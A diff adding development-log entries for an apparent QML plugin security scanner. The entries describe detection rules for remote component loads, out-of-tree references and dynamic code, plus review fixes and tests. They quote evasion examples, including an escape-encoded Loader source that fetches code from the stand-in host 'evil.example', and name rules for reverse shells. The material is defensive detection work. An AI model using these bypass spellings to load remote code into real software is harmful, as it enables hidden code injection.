@@ -1121,3 +1121,222 @@ OMASAFE_H0_ALLOW_LIFECYCLE=1 scripts/h0-runtime-reverify.sh --with-lifecycle
 
 Next: H2 (reference sinks) with the split severity from the H0 record; clean-VM
 re-run of the H0 script before tagging.
+
+## v0.2.1 H2 — Reference Sinks: Remote, Out-of-Tree, Typed Rejections
+
+Status: **complete**
+
+Implemented per `docs/plans/v0.2.1-hardening-implementation.md` (maps to review
+findings R-1 and R-2), with the severity split the H0 record fixed:
+
+- New High rule `oma.qml.remote-component-load`: a URL-scheme literal at the
+  two H0-verified reachable load positions — `Loader.source` and
+  `Qt.createComponent(...)`. Until now a literal remote `Loader` source took
+  the `Value::Static` branch and was silently dropped as an unresolvable
+  reference; the network detectors never saw it either.
+- New indicator `oma.qml.remote-directory-import` (Low, never the High rule):
+  remote directory imports, `as`-qualified or bare, with or without a qmldir.
+  Per H0 probe C these are scanner-intercepted on the pinned runtime, so the
+  rule records intent; its guidance demands re-probing any newer runtime
+  before escalation. Local relative directory imports stay silent.
+- New Medium rule `oma.qml.out-of-tree-reference`: absolute-path and traversal
+  references at load sinks (`Loader.source`, `Qt.createComponent`, `Qt.include`)
+  and in directory-import specifiers. Summary and guidance describe these as
+  unreviewed out-of-tree loads that bypass commit-bound review — explicitly
+  not sandbox escapes; there is no runtime sandbox.
+- `Qt.createComponent(` and `Qt.include(` joined both dynamic-code needle
+  sets: the AST call list (`eval | createQmlObject | atob` -> `+ createComponent
+  | include`) and the lexical set, so both spellings carry
+  `oma.qml.dynamic-code` and the `dynamic-code-execution` capability.
+- Typed sink-position rejections (R-2): reference candidates now carry a sink
+  marker for the six verified positions (`Loader.source`,
+  `Qt.createComponent`, `Qt.include`, `Process.command`, `execDetached`,
+  `FileView.path`). When a sink-position candidate fails in-tree resolution,
+  `analyze_inventory` records a `sink-reference-rejected:<reason>` limitation
+  with reason `remote`, `absolute`, `traversal`, `missing-local-target`, or
+  `unsupported-scheme`, sorted and deduplicated for deterministic reports.
+  A finding-bearing spelling (remote at a load sink, out-of-tree at a load
+  sink) is consumed by its finding — the two disclosures never double-report
+  the same literal. Non-sink path-shaped strings stay inventory context
+  exactly as before, so icon names, format strings, and unresolvable
+  non-sink paths produce nothing.
+- Rejection classification mirrors `resolve_reference`'s rejection order
+  (absolute, then scheme spelling — `http`/`https` are the remote family,
+  other schemes are `unsupported-scheme` — then traversal after stripping the
+  ordinary leading `./`, then `missing-local-target`).
+- AST/lexical parity: the AST path marks candidates precisely at binding and
+  call arguments (static-shaped values only — computed fragments are left to
+  the H4 dataflow slice); the lexical fallback marks quoted literals on lines
+  that spell a sink construct and handles `import "<specifier>"` lines.
+  Multi-line lexical constructs degrade to context, consistent with the
+  documented lexical-fallback semantics.
+- Resolved sink references still form invocation edges and mark
+  `invocation_target` (local `Loader`, `FileView.path`, and `Qt.include`
+  targets are unchanged behavior).
+- New adversarial fixtures under `fixtures/plugins/` (each a valid plugin
+  tree, load-bearing via CLI tests): `remote-component-loader`,
+  `remote-create-component`, `remote-directory-import` (remote + local qmldir
+  variant), `out-of-tree-absolute`, `out-of-tree-traversal`, and
+  `benign-references` (icon names, format strings, commented URL, non-sink
+  path-shaped string, resolving local Loader). Loader bindings are spelled
+  single-line so both feature configs exercise sink marking; multi-line
+  Loader blocks degrade to context in lexical builds by design.
+- Catalog: `RULE_CATALOG_VERSION` 3 -> 4; `SEVERITY_TABLE_VERSION` unchanged
+  (new rules are a catalog change, not a severity-table rewrite). The
+  surface-anchor test pins the three H0-verified anchors.
+
+Tests: analyzer unit tests cover literal-remote Loader/createComponent High
+findings with per-path confidence, indicator-only directory imports, local
+import silence, out-of-tree Medium findings, the `Qt.include`
+remote-vs-out-of-tree split, all five typed rejection reasons, non-sink
+silence, edge resolution through sink candidates, and lexical JS parity; CLI
+tests scan all six fixtures end-to-end and the old negative-provenance test
+now asserts the traversal Loader finding instead of expecting silence. The
+release-gate self-scan now carries the fixture findings by design (the
+adversarial fixtures live in this repository); each fixture produces exactly
+the rule it exists to prove.
+
+Verification:
+
+```text
+cargo fmt --all -- --check
+cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
+cargo test --workspace                                   # 70 cli + 15 trust tests
+scripts/determinism-canary.sh                            # exit 0
+scripts/release-gate.sh --skip-network                   # exit 0
+```
+
+Next: H3 (script pattern expansion) and the H7 early-pass triage kickoff for
+`oma.script.reverse-shell` and
+`oma.script.privileged-shared-temp-controlled`.
+
+## v0.2.1 H2 — Review Response (six findings)
+
+Status: **complete**
+
+Second-pass review found six issues, four of which could miss or falsely
+create blocking findings. All six are closed with regression tests; the
+review's own escape-hatch fixtures (multi-line Loader spelling) were the only
+test changes needed outside the analyzer.
+
+1. **Escaped literals bypassed remote-load detection (P1).**
+   `string_literal_content` kept only `string_fragment` nodes, so
+   `Loader { source: "\x68ttps://evil.example/W.qml" }` — a valid runtime
+   HTTPS URL — was analyzed as `ttps://…` and emitted nothing. String
+   extraction now decodes escape sequences (added `decode_js_escapes`):
+   `\xHH`, `\uHHHH`, `\u{…}`, the standard single-character escapes, and
+   JS unknown-escape semantics (backslash dropped). Decoding happens exactly
+   once per escape, at extraction, on both paths — the AST decodes each
+   `escape_sequence` node individually so a literal backslash produced by
+   `\\` cannot be re-decoded into scheme characters, and the lexical path
+   decodes raw literal content at extraction. Evidence carries the decoded
+   runtime value; a doubled-backslash literal regresses as NOT remote.
+2. **Qualified Loader types were silently missed (P1).** The grammar permits
+   `nested_identifier` object types, but `is_loader` and
+   `handle_object_definition` examined only direct `identifier` children, so
+   `import QtQuick as QQ; QQ.Loader { source: "https://…" }` bypassed sink
+   marking. Type resolution now takes the terminal segment of the resolved
+   type node (`QQ.Loader` -> `Loader`) for every inventoried object type
+   (Loader, Process, FileView, Timer), so qualified spellings reach the same
+   sink rules, capability observations, and edge resolution.
+3. **Scheme matching was too narrow (P1).** Scheme parsing is centralized in
+   `scheme_class` and applied identically by rejection reasons, the
+   remote-load family, and the out-of-tree family. Schemes are
+   case-insensitive (RFC 3986), so `HTTPS://…` now carries the High finding
+   with its original spelling preserved in evidence. The remote set is the
+   network transports Qt's component loader accepts on the pinned runtime
+   (`http`, `https`). `file://` URLs are classified as local paths — the
+   Medium out-of-tree family at load sinks, and the `absolute` rejection
+   reason at non-load sinks — never remote, never plain `unsupported-scheme`.
+4. **User-defined methods could become Qt findings (P1).** `callee_name` is
+   the last member segment, so `backend.createComponent("https://…")` was
+   treated as `Qt.createComponent`. AST call handling now verifies the
+   receiver is the Qt global (identifier `Qt`, not a member expression) for
+   `createComponent` and `include` before applying the Qt-specific rules —
+   both their sink/reference handling and their dynamic-code emission. The
+   lexical path matches only the `Qt.createComponent(`/`Qt.include(`
+   spellings, which cannot match a different receiver. `eval`, `atob`,
+   `createQmlObject`, and `new Function` keep their published receiver-blind
+   semantics.
+5. **Rejection resolution ignored the analysis budget and had no output cap
+   (P1).** The resolution loop now checks `TimeBudget::expired()` per edge
+   and discloses `analysis_time_budget_exhausted` (deduplicated against the
+   scan loop's disclosure) on expiry. Retained sink rejections are capped at
+   a new `MAX_SINK_REJECTIONS` (256, wired into the limits configuration and
+   hence the policy identity); overflow emits a
+   `sink-reference-rejections-truncated:<total>` limitation. An adversarial
+   tree of unique sink literals can no longer expand limitation strings
+   without bound.
+6. **Lexical sink marking attributed every literal on the line (P2).** The
+   whole-line marking let `Loader { source: "Panel.qml"; property string
+   docs: "https://docs.example" }` produce a High finding for the unrelated
+   `docs` value in the no-parser build, and any `command` identifier on a
+   standalone-JS line was treated as `Process.command`. Marking is now
+   span-scoped: call arguments via `balanced_bracket_span`, binding values
+   via `binding_value_span` (Loader.source, FileView.path, Process.command)
+   and the `execDetached` argument span. This exposed a latent
+   `binding_value_span` bug the new spans depend on: the scalar scan broke
+   on `//` inside quoted strings, truncating URL-valued bindings at their
+   scheme (`"https:`); the scan is now quote-aware. The review's example now
+   yields exactly one rejection for `Panel.qml` and nothing else.
+
+Tests: ten new analyzer tests pin escape decoding (including the
+double-backslash non-decode), qualified Loader/Process types, case
+insensitivity and `file://` classification, Qt-receiver verification on both
+paths, the rejection cap and truncation disclosure, budget-bounded
+resolution, and lexical span scoping. Full verification re-run:
+
+```text
+cargo fmt --all -- --check
+cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
+cargo test --workspace                                   # 111 analyzer (parser) / 101 (lexical)
+scripts/release-gate.sh --skip-network                   # exit 0
+```
+
+## v0.2.1 H2 — Review Response (second round, four findings)
+
+Status: **complete**
+
+1. **Nested bindings inherited the outer Loader sink (P1).** The object
+   brace scope includes nested child objects, and the binding search did not
+   track brace depth, so `Loader { Image { source: "https://…" } }` treated
+   the nested Image.source as Loader.source and emitted a false High finding
+   in lexical mode. `mark_binding_literals` now splits the matched object's
+   body into depth-zero segments (slicing only at brace bytes, which are
+   ASCII and cannot split a multi-byte character) and marks bindings only
+   there; a depth-zero binding next to a nested child still participates.
+   AST parity pinned: the parser path already resolved only the owning
+   object's direct bindings.
+2. **Lexical dynamic-code detection used the old Qt needle (P2).** Sink
+   detection verifies the Qt-global receiver via `find_qt_global_calls`, but
+   dynamic-code still matched the raw substring, so
+   `backend.Qt.createComponent(...)` emitted `oma.qml.dynamic-code` while a
+   valid `Qt . createComponent(...)` (whitespace around the dot) emitted the
+   remote-load finding but MISSED the required dynamic-code finding and
+   capability. Both needles now go through `find_qt_global_calls`, keeping
+   dynamic-code and sink verdicts consistent on both shapes.
+3. **Overflow count was not unique after the cap (P2).** Once the retained
+   unique set is full, omitted rejections are not remembered, so repeating
+   the same unretained rejection incremented the overflow counter each time
+   while comments described a unique count. The counter is now honestly an
+   OCCURRENCE count (`sink_rejections_omitted`, documented in code): remembering
+   which values were omitted would need unbounded fingerprints under
+   adversarial input. A new test pins that two occurrences of the same value
+   past the full set report `sink-reference-rejections-truncated:2`; the
+   existing unique-set and duplicate-crowding tests are unchanged.
+4. **Formatting gate failed (P1).** `cargo fmt --all` applied; the gate was
+   re-run end-to-end (format, clippy both feature configs, workspace tests
+   both configs — 111 analyzer tests with the parser / 101 without, 70 CLI
+   tests — generated assets, determinism canary, corpus tooling self-tests,
+   self-scan) and passes.
+
+```text
+cargo fmt --all -- --check
+cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
+cargo test --workspace                                   # 111 analyzer (parser) / 101 (lexical)
+scripts/release-gate.sh --skip-network                   # exit 0
+```
+
+Next: H3 (script pattern expansion) and the H7 early-pass triage kickoff for
+`oma.script.reverse-shell` and
+`oma.script.privileged-shared-temp-controlled`.
